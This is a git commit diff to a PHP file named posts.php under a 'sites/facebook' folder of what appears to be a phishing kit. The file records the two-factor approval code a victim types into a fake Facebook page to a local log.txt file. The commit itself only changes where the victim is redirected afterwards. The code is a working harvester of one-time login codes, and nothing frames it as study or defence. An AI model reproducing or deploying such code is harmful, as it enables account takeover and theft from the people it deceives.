8f1115b7978578cedf092fa6267d7c3f16928346
Osodiq43 <79153860+Osodiq43@users.noreply.github.com>
2021-02-16 16:14:11 +0100

    Update posts.php

--- sites/facebook/posts.php
+++ sites/facebook/posts.php
@@ -1,5 +1,5 @@
 <?php
 
     file_put_contents("log.txt", "OTP: " . $_POST['approvals_code'] . "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/');
+header('Location: https://www.crunchbase.com/organization/tapme');
 exit();
